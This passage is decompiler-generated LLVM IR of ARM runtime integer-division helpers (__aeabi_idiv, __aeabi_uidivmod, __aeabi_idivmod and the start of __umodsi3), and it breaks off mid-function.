  %v1_1c0b4 = phi i32 [ %v1_1c0a8, %bb98 ], [ %v4_1c0a8, %bb99 ], [ %v4_1c0a8, %bb100 ]
  %v2_1c0b0 = icmp ugt i32 %v1_1c0b4, 15
  br i1 %v2_1c0b0, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_1c0b4 = and i32 %v1_1c0b4, 8
  %v3_1c0b4 = icmp eq i32 %v2_1c0b4, 0
  %v4_1c0b4 = udiv i32 %v1_1c0b4, 16
  br i1 %v3_1c0b4, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_1c0b8 = add nsw i32 %v1_1c0b8, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_1c0c0 = phi i32 [ %v1_1c0b8, %.thread17 ], [ %v1_1c0b8, %bb101 ], [ %v2_1c0b8, %bb102 ]
  %v5_1c0c4 = phi i32 [ %v1_1c0b4, %.thread17 ], [ %v4_1c0b4, %bb101 ], [ %v4_1c0b4, %bb102 ]
  %v2_1c0bc = icmp ugt i32 %v5_1c0c4, 3
  %v7_1c0bc = icmp eq i32 %v5_1c0c4, 4
  %v2_1c0c0 = xor i1 %v7_1c0bc, true
  %v3_1c0c0 = and i1 %v2_1c0bc, %v2_1c0c0
  br i1 %v3_1c0c0, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_1c0c0 = add nsw i32 %v4_1c0c0, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_1c0c4 = phi i32 [ %v4_1c0c0, %.thread18 ], [ %v5_1c0c0, %bb103 ]
  %v2_1c0c4 = xor i1 %v2_1c0bc, true
  %v3_1c0c4 = or i1 %v7_1c0bc, %v2_1c0c4
  br i1 %v3_1c0c4, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_1c0c4 = udiv i32 %v5_1c0c4, 2
  %v9_1c0c4 = add i32 %v4_1c0c4, %v8_1c0c4
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_1c0c8 = phi i32 [ %v4_1c0c4, %bb104 ], [ %v9_1c0c4, %bb105 ]
  %v6_1c0c8 = lshr i32 %v0_1bff4, %v1_1c0c8
  ret i32 %v6_1c0c8

dec_label_pc_1c0d0:                               ; preds = %bb80
  %v0_1c0d0 = load i32, i32* @lr, align 4
  %v0_1c0d4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1c0d0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1c0c4, { 1, 0 }
  uselistorder i1 %v7_1c0bc, { 1, 0 }
  uselistorder i32 %v4_1c0b4, { 1, 0 }
  uselistorder i32 %v1_1c0b4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c0a8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1c0a8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c098, { 1, 0 }
  uselistorder i32 %v0_1c070, { 1, 0 }
  uselistorder i32 %v4_1c064, { 1, 0 }
  uselistorder i32 %v1_1c06c, { 1, 2, 0 }
  uselistorder i32 %v4_1c058, { 1, 0 }
  uselistorder i32 %v1_1c060, { 1, 2, 0 }
  uselistorder i32 %v4_1c04c, { 1, 0 }
  uselistorder i32 %v1_1c054, { 1, 2, 0 }
  uselistorder i32 %v1_1c078, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1c048, { 1, 0 }
  uselistorder i32 %v1_1c074, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1c034, { 1, 0 }
  uselistorder i32 %v3_1c030, { 1, 0 }
  uselistorder i32 %v1_1c030, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1c034, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1c020, { 1, 0 }
  uselistorder i32 %v4_1c01c, { 2, 1, 0 }
  uselistorder i32 %v1_1c020, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1c028.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_1bff4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_1c080, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1c03c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c028thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1c0e4 = udiv i32 %arg1, %arg2
  ret i32 %v2_1c0e4
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1c0f8 = icmp slt i32 %arg2, 0
  %v2_1c0f8 = icmp eq i32 %arg2, 0
  %v0_1c0fc = load i32, i32* @r0, align 4
  %v2_1c0fc = xor i32 %v0_1c0fc, %arg2
  br i1 %v2_1c0f8, label %dec_label_pc_1c210, label %dec_label_pc_1c104

dec_label_pc_1c104:                               ; preds = %entry
  br i1 %v1_1c0f8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1c104
  %v2_1c104 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1c104, %bb
  %v1_1c1d0 = phi i32 [ %v2_1c104, %bb ], [ %arg2, %dec_label_pc_1c104 ]
  %v1_1c108 = add i32 %v1_1c1d0, -1
  %v7_1c108 = icmp eq i32 %v1_1c1d0, 1
  br i1 %v7_1c108, label %dec_label_pc_1c1b0, label %dec_label_pc_1c110

dec_label_pc_1c110:                               ; preds = %thread-pre-split
  %v1_1c110 = icmp slt i32 %v0_1c0fc, 0
  br i1 %v1_1c110, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1c110
  %v2_1c114 = sub i32 0, %v0_1c0fc
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1c110, %bb85
  %v0_1c204 = phi i32 [ %v0_1c0fc, %dec_label_pc_1c110 ], [ %v2_1c114, %bb85 ]
  %v3_1c118 = icmp uge i32 %v0_1c204, %v1_1c1d0
  %v9_1c118 = icmp eq i32 %v0_1c204, %v1_1c1d0
  %v2_1c11c = xor i1 %v3_1c118, true
  %v3_1c11c = or i1 %v9_1c118, %v2_1c11c
  br i1 %v3_1c11c, label %dec_label_pc_1c1bc, label %dec_label_pc_1c120

dec_label_pc_1c120:                               ; preds = %bb86
  %v2_1c120 = and i32 %v1_1c108, %v1_1c1d0
  %v4_1c120 = icmp eq i32 %v2_1c120, 0
  br i1 %v4_1c120, label %dec_label_pc_1c1cc, label %dec_label_pc_1c128

dec_label_pc_1c128:                               ; preds = %dec_label_pc_1c120
  %v3_1c128 = icmp ult i32 %v1_1c1d0, 536870912
  br i1 %v3_1c128, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1c128
  %v4_1c12c = mul i32 %v1_1c1d0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1c128, %.thread
  %v0_1c14c.pr40.ph = phi i32 [ %v4_1c12c, %.thread ], [ %v1_1c1d0, %dec_label_pc_1c128 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1c128 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1c14c.pr40 = phi i32 [ %v4_1c140, %bb89 ], [ %v0_1c14c.pr40.ph, %.preheader.preheader ]
  %v1_1c144 = phi i32 [ %v4_1c144, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1c138 = icmp ugt i32 %v0_1c14c.pr40, 268435455
  br i1 %v2_1c138, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1c14cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1c13c = icmp ult i32 %v0_1c14c.pr40, %v0_1c204
  br i1 %v4_1c13c, label %bb88, label %dec_label_pc_1c14cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1c140 = and i32 %v0_1c14c.pr40, 268435456
  %v3_1c140 = icmp eq i32 %v2_1c140, 0
  %v4_1c140 = mul i32 %v0_1c14c.pr40, 16
  br i1 %v3_1c140, label %bb89, label %dec_label_pc_1c14c.loopexit

bb89:                                             ; preds = %bb88
  %v2_1c144 = and i32 %v1_1c144, 268435456
  %v3_1c144 = icmp eq i32 %v2_1c144, 0
  %v4_1c144 = mul i32 %v1_1c144, 16
  br i1 %v3_1c144, label %.preheader, label %dec_label_pc_1c14cthread-pre-split.loopexit.loopexit

dec_label_pc_1c14cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1c15852.ph = phi i32 [ %v1_1c144, %bb87 ], [ %v4_1c144, %bb89 ]
  %v0_1c14c.pr42.ph = phi i32 [ %v0_1c14c.pr40, %bb87 ], [ %v4_1c140, %bb89 ]
  br label %dec_label_pc_1c14cthread-pre-split.loopexit

dec_label_pc_1c14cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1c14cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1c15852 = phi i32 [ %v1_1c144, %.thread3 ], [ %v1_1c15852.ph, %dec_label_pc_1c14cthread-pre-split.loopexit.loopexit ]
  %v0_1c14c.pr42 = phi i32 [ %v0_1c14c.pr40, %.thread3 ], [ %v0_1c14c.pr42.ph, %dec_label_pc_1c14cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1c14cthread-pre-split

dec_label_pc_1c14cthread-pre-split:               ; preds = %dec_label_pc_1c14cthread-pre-split.loopexit, %bb91
  %v1_1c15850 = phi i32 [ %v1_1c15852, %dec_label_pc_1c14cthread-pre-split.loopexit ], [ %v3_1c158, %bb91 ]
  %v2_1c15048 = phi i32 [ %v0_1c204, %dec_label_pc_1c14cthread-pre-split.loopexit ], [ %v2_1c150, %bb91 ]
  %v0_1c14c.pr = phi i32 [ %v0_1c14c.pr42, %dec_label_pc_1c14cthread-pre-split.loopexit ], [ %v3_1c154, %bb91 ]
  br label %dec_label_pc_1c14c

dec_label_pc_1c14c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1c14c

dec_label_pc_1c14c:                               ; preds = %dec_label_pc_1c14c.loopexit, %dec_label_pc_1c14cthread-pre-split
  %v1_1c158 = phi i32 [ %v1_1c15850, %dec_label_pc_1c14cthread-pre-split ], [ %v1_1c144, %dec_label_pc_1c14c.loopexit ]
  %v2_1c150 = phi i32 [ %v2_1c15048, %dec_label_pc_1c14cthread-pre-split ], [ %v0_1c204, %dec_label_pc_1c14c.loopexit ]
  %v1_1c154 = phi i32 [ %v0_1c14c.pr, %dec_label_pc_1c14cthread-pre-split ], [ %v4_1c140, %dec_label_pc_1c14c.loopexit ]
  %v2_1c14c = icmp slt i32 %v1_1c154, 0
  br i1 %v2_1c14c, label %dec_label_pc_1c160, label %bb90

bb90:                                             ; preds = %dec_label_pc_1c14c
  %v4_1c150 = icmp ult i32 %v1_1c154, %v2_1c150
  br i1 %v4_1c150, label %bb91, label %dec_label_pc_1c160

bb91:                                             ; preds = %bb90
  %v3_1c154 = mul i32 %v1_1c154, 2
  %v2_1c158 = icmp slt i32 %v1_1c158, 0
  %v3_1c158 = mul i32 %v1_1c158, 2
  br i1 %v2_1c158, label %dec_label_pc_1c160, label %dec_label_pc_1c14cthread-pre-split

dec_label_pc_1c160:                               ; preds = %bb90, %dec_label_pc_1c14c, %bb91
  %v2_1c16c63 = phi i32 [ %v3_1c158, %bb91 ], [ %v1_1c158, %bb90 ], [ %v1_1c158, %dec_label_pc_1c14c ]
  %v1_1c16455 = phi i32 [ %v3_1c154, %bb91 ], [ %v1_1c154, %bb90 ], [ %v1_1c154, %dec_label_pc_1c14c ]
  br label %dec_label_pc_1c164

dec_label_pc_1c164:                               ; preds = %.thread13, %dec_label_pc_1c160
  %v1_1c198 = phi i32 [ %v4_1c198, %.thread13 ], [ %v2_1c16c63, %dec_label_pc_1c160 ]
  %v1_1c16c = phi i32 [ %v1_1c1a8, %.thread13 ], [ 0, %dec_label_pc_1c160 ]
  %v1_1c19c = phi i32 [ %v4_1c19c, %.thread13 ], [ %v1_1c16455, %dec_label_pc_1c160 ]
  %v1_1c168 = phi i32 [ %v0_1c194, %.thread13 ], [ %v0_1c204, %dec_label_pc_1c160 ]
  %v3_1c164 = icmp ult i32 %v1_1c168, %v1_1c19c
  br i1 %v3_1c164, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1c164
  %v3_1c168 = sub i32 %v1_1c168, %v1_1c19c
  %v3_1c16c = or i32 %v1_1c16c, %v1_1c198
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1c164, %bb92
  %v1_1c174 = phi i32 [ %v1_1c168, %dec_label_pc_1c164 ], [ %v3_1c168, %bb92 ]
  %v1_1c178 = phi i32 [ %v1_1c16c, %dec_label_pc_1c164 ], [ %v3_1c16c, %bb92 ]
  %v4_1c170 = udiv i32 %v1_1c19c, 2
  %v6_1c170 = icmp ult i32 %v1_1c174, %v4_1c170
  br i1 %v6_1c170, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1c174 = urem i32 %v1_1c19c, 2
  %v4_1c174 = icmp eq i32 %v3_1c174, 0
  %v6_1c174 = sub i32 %v1_1c174, %v4_1c170
  br i1 %v4_1c174, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1c178 = udiv i32 %v1_1c198, 2
  %v6_1c178 = or i32 %v1_1c178, %v5_1c178
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1c180 = phi i32 [ %v6_1c174, %bb93 ], [ %v1_1c174, %.thread8 ], [ %v6_1c174, %bb94 ]
  %v1_1c184 = phi i32 [ %v1_1c178, %bb93 ], [ %v1_1c178, %.thread8 ], [ %v6_1c178, %bb94 ]
  %v4_1c17c = udiv i32 %v1_1c19c, 4
  %v6_1c17c = icmp ult i32 %v1_1c180, %v4_1c17c
  br i1 %v6_1c17c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1c180 = and i32 %v1_1c19c, 2
  %v4_1c180 = icmp eq i32 %v3_1c180, 0
  %v6_1c180 = sub i32 %v1_1c180, %v4_1c17c
  br i1 %v4_1c180, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1c184 = udiv i32 %v1_1c198, 4
  %v6_1c184 = or i32 %v1_1c184, %v5_1c184
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1c18c = phi i32 [ %v6_1c180, %bb95 ], [ %v1_1c180, %.thread9 ], [ %v6_1c180, %bb96 ]
  %v1_1c190 = phi i32 [ %v1_1c184, %bb95 ], [ %v1_1c184, %.thread9 ], [ %v6_1c184, %bb96 ]
  %v4_1c188 = udiv i32 %v1_1c19c, 8
  %v6_1c188 = icmp ult i32 %v1_1c18c, %v4_1c188
  br i1 %v6_1c188, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1c18c = and i32 %v1_1c19c, 4
  %v4_1c18c = icmp eq i32 %v3_1c18c, 0
  %v6_1c18c = sub i32 %v1_1c18c, %v4_1c188
  br i1 %v4_1c18c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1c190 = udiv i32 %v1_1c198, 8
  %v6_1c190 = or i32 %v1_1c190, %v5_1c190
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1c1a8 = phi i32 [ %v1_1c190, %bb97 ], [ %v1_1c190, %.thread10 ], [ %v6_1c190, %bb98 ]
  %v0_1c194 = phi i32 [ %v6_1c18c, %bb97 ], [ %v1_1c18c, %.thread10 ], [ %v6_1c18c, %bb98 ]
  %v2_1c194 = icmp eq i32 %v0_1c194, 0
  br i1 %v2_1c194, label %dec_label_pc_1c1a4, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1c198, 16
  br i1 %tmp, label %dec_label_pc_1c1a4, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1c198 = udiv i32 %v1_1c198, 16
  %v4_1c19c = udiv i32 %v1_1c19c, 16
  br label %dec_label_pc_1c164

dec_label_pc_1c1a4:                               ; preds = %thread-pre-split12, %bb99
  %v1_1c1a4 = icmp slt i32 %v2_1c0fc, 0
  br i1 %v1_1c1a4, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1c1a4
  %v2_1c1a8 = sub i32 0, %v1_1c1a8
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1c1b0, %dec_label_pc_1c1a4, %bb100
  %v1_1c1ac = phi i32 [ %v1_1c1a8, %dec_label_pc_1c1a4 ], [ %v2_1c1a8, %bb100 ], [ %v0_1c0fc, %dec_label_pc_1c1b0 ], [ %v2_1c1b4, %bb101 ], [ %v1_1c1c880, %bb103 ], [ %v2_1c1c4, %bb104 ]
  ret i32 %v1_1c1ac

dec_label_pc_1c1b0:                               ; preds = %thread-pre-split
  br i1 %v1_1c0f8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1c1b0
  %v2_1c1b4 = sub i32 0, %v0_1c0fc
  br label %.thread16

dec_label_pc_1c1bc:                               ; preds = %bb86
  br i1 %v3_1c118, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1c1bc
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1c1bc, %bb102
  %v1_1c1c880 = phi i32 [ %v0_1c0fc, %dec_label_pc_1c1bc ], [ 0, %bb102 ]
  br i1 %v9_1c118, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1c1c0 = ashr i32 %v2_1c0fc, 31
  %v2_1c1c4 = or i32 %v4_1c1c0, 1
  br label %.thread16

dec_label_pc_1c1cc:                               ; preds = %dec_label_pc_1c120
  %v2_1c1cc = icmp ugt i32 %v1_1c1d0, 65535
  br i1 %v2_1c1cc, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1c1cc
  %v2_1c1d0 = and i32 %v1_1c1d0, 32768
  %v3_1c1d0 = icmp eq i32 %v2_1c1d0, 0
  %v4_1c1d0 = udiv i32 %v1_1c1d0, 65536
  br i1 %v3_1c1d0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1c1cc
  %v0_1c1dc70 = phi i32 [ %v1_1c1d0, %dec_label_pc_1c1cc ], [ %v4_1c1d0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1c1e0 = phi i32 [ %v0_1c1dc70, %.thread19 ], [ %v4_1c1d0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1c1dc = icmp ugt i32 %v1_1c1e0, 255
  br i1 %v2_1c1dc, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1c1e0 = and i32 %v1_1c1e0, 128
  %v3_1c1e0 = icmp eq i32 %v2_1c1e0, 0
  %v4_1c1e0 = udiv i32 %v1_1c1e0, 256
  br i1 %v3_1c1e0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1c1e4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1c1f0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1c1e4, %bb108 ]
  %v1_1c1ec = phi i32 [ %v1_1c1e0, %bb106 ], [ %v4_1c1e0, %bb107 ], [ %v4_1c1e0, %bb108 ]
  %v2_1c1e8 = icmp ugt i32 %v1_1c1ec, 15
  br i1 %v2_1c1e8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1c1ec = and i32 %v1_1c1ec, 8
  %v3_1c1ec = icmp eq i32 %v2_1c1ec, 0
  %v4_1c1ec = udiv i32 %v1_1c1ec, 16
  br i1 %v3_1c1ec, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1c1f0 = add nsw i32 %v1_1c1f0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1c1f8 = phi i32 [ %v1_1c1f0, %.thread20 ], [ %v1_1c1f0, %bb109 ], [ %v2_1c1f0, %bb110 ]
  %v5_1c1fc = phi i32 [ %v1_1c1ec, %.thread20 ], [ %v4_1c1ec, %bb109 ], [ %v4_1c1ec, %bb110 ]
  %v2_1c1f4 = icmp ugt i32 %v5_1c1fc, 3
  %v7_1c1f4 = icmp eq i32 %v5_1c1fc, 4
  %v2_1c1f8 = xor i1 %v7_1c1f4, true
  %v3_1c1f8 = and i1 %v2_1c1f4, %v2_1c1f8
  br i1 %v3_1c1f8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1c1f8 = add nsw i32 %v4_1c1f8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1c1fc = phi i32 [ %v4_1c1f8, %.thread21 ], [ %v5_1c1f8, %bb111 ]
  %v2_1c1fc = xor i1 %v2_1c1f4, true
  %v3_1c1fc = or i1 %v7_1c1f4, %v2_1c1fc
  br i1 %v3_1c1fc, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1c1fc = udiv i32 %v5_1c1fc, 2
  %v9_1c1fc = add i32 %v4_1c1fc, %v8_1c1fc
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1c204 = phi i32 [ %v4_1c1fc, %bb112 ], [ %v9_1c1fc, %bb113 ]
  %v1_1c200 = icmp slt i32 %v2_1c0fc, 0
  %v6_1c204 = lshr i32 %v0_1c204, %v1_1c204
  %v2_1c208 = sub i32 0, %v6_1c204
  %v2_1c208.v6_1c204 = select i1 %v1_1c200, i32 %v2_1c208, i32 %v6_1c204
  ret i32 %v2_1c208.v6_1c204

dec_label_pc_1c210:                               ; preds = %entry
  %v0_1c210 = load i32, i32* @lr, align 4
  %v0_1c214 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1c210)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1c1fc, { 1, 0 }
  uselistorder i1 %v7_1c1f4, { 1, 0 }
  uselistorder i32 %v4_1c1ec, { 1, 0 }
  uselistorder i32 %v1_1c1ec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c1e0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1c1e0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c1d0, { 1, 0 }
  uselistorder i32 %v0_1c194, { 1, 0 }
  uselistorder i32 %v4_1c188, { 1, 0 }
  uselistorder i32 %v1_1c190, { 1, 2, 0 }
  uselistorder i32 %v4_1c17c, { 1, 0 }
  uselistorder i32 %v1_1c184, { 1, 2, 0 }
  uselistorder i32 %v4_1c170, { 1, 0 }
  uselistorder i32 %v1_1c178, { 1, 2, 0 }
  uselistorder i32 %v1_1c19c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1c16c, { 1, 0 }
  uselistorder i32 %v1_1c198, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1c158, { 1, 0 }
  uselistorder i32 %v3_1c154, { 1, 0 }
  uselistorder i32 %v1_1c154, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1c150, { 1, 0 }
  uselistorder i32 %v1_1c158, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1c144, { 1, 0 }
  uselistorder i32 %v4_1c140, { 2, 1, 0 }
  uselistorder i32 %v1_1c144, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1c14c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1c118, { 1, 0 }
  uselistorder i32 %v1_1c1d0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1c0fc, { 1, 0, 2 }
  uselistorder i32 %v0_1c0fc, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 15, { 5, 6, 4, 9, 10, 3, 8, 11, 2, 12, 0, 7, 1 }
  uselistorder i32 256, { 2, 3, 4, 153, 5, 6, 151, 12, 11, 13, 7, 8, 9, 10, 14, 15, 16, 17, 18, 162, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 31, 29, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0, 54, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 68, 154, 69, 70, 72, 73, 71, 74, 155, 159, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 164, 104, 165, 105, 166, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 152, 1, 120, 119, 118, 123, 122, 121, 124, 125, 126, 127, 163, 128, 129, 130, 150, 135, 131, 132, 136, 133, 134, 137, 142, 138, 139, 141, 140, 143, 145, 144, 167, 160, 146, 168, 147, 148, 161, 149, 156, 157, 158 }
  uselistorder i32 128, { 13, 14, 7, 8, 9, 11, 6, 22, 0, 27, 1, 21, 20, 10, 23, 24, 2, 3, 12, 25, 26, 4, 17, 28, 29, 19, 18, 15, 16, 5 }
  uselistorder i32 255, { 4, 5, 9, 1, 2, 6, 3, 7, 8, 0 }
  uselistorder i32 32768, { 4, 5, 0, 3, 2, 6, 1 }
  uselistorder i32 65535, { 1, 2, 0 }
  uselistorder i32 31, { 14, 1, 12, 13, 11, 4, 15, 3, 2, 0, 5, 7, 6, 8, 16, 17, 10, 18, 20, 9, 19 }
  uselistorder i1 true, { 1, 2, 3, 4, 5, 61, 64, 6, 7, 67, 9, 8, 10, 11, 12, 13, 14, 75, 70, 15, 16, 17, 18, 19, 20, 71, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 33, 34, 37, 38, 60, 76, 39, 40, 41, 62, 42, 43, 44, 45, 63, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0, 72, 57, 58, 73, 74, 68, 69, 59, 65, 66 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1c1a4, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1c160, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c14cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1c224 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1c224
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1c238 = add i32 %arg2, -1
  %v2_1c238 = icmp eq i32 %arg2, 0
  br i1 %v2_1c238, label %dec_label_pc_1c2f4, label %dec_label_pc_1c240

dec_label_pc_1c240:                               ; preds = %entry
  %v7_1c238 = icmp eq i32 %arg2, 1
  br i1 %v7_1c238, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_1c240
  %v1_1c240 = load i32, i32* @r0, align 4
  %v10_1c240 = icmp eq i32 %v1_1c240, %arg2
  br i1 %v10_1c240, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_1c240, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_1c240 = icmp ult i32 %v1_1c240, %arg2
  br i1 %v4_1c240, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_1c248 = and i32 %v1_1c238, %arg2
  %v8_1c248 = icmp eq i32 %v6_1c248, 0
  br i1 %v8_1c248, label %.thread67, label %dec_label_pc_1c258.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_1c24c = phi i32 [ %v1_1c240, %bb75 ], [ 0, %.thread65 ]
  %v3_1c24c = and i32 %v1_1c24c, %v1_1c238
  br label %bb76

dec_label_pc_1c258.preheader:                     ; preds = %bb75
  %v2_1c25899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1c25899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_1c2e8, %bb74, %bb89, %bb84, %dec_label_pc_1c2b8, %.thread67
